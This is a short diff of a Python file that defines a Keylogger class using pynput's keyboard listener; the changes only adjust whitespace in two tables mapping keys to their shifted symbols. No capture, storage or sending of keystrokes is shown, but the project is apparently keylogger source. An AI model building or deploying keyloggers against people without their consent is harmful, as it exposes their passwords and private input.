@@ -5,6 +5,7 @@
 from threading import Thread
 from pynput.keyboard import Key, Listener
 
+
 class Keylogger(object):
 
     def __init__(self):
@@ -13,13 +14,13 @@ class Keylogger(object):
         self.listener = None
         self.is_alive = True
         self.num_to_symbol = {
-         '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
-         '6': '^', '7': '&', '8': '*', '9': '(', '0': ')'
+            '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
+            '6': '^', '7': '&', '8': '*', '9': '(', '0': ')'
         }
 
         self.sym_to_symbol = {
-         '`': '~', ',': '<', '.': '>', '/': '?', '\'': '\"', '\\': '|',
-         ';':  ':', '[': '{', ']': '}', '-': '_', '=': '+'
+            '`': '~', ',': '<', '.': '>', '/': '?', '\'': '\"', '\\': '|',
+            ';':  ':', '[': '{', ']': '}', '-': '_', '=': '+'
         }
 
     def _start(self):
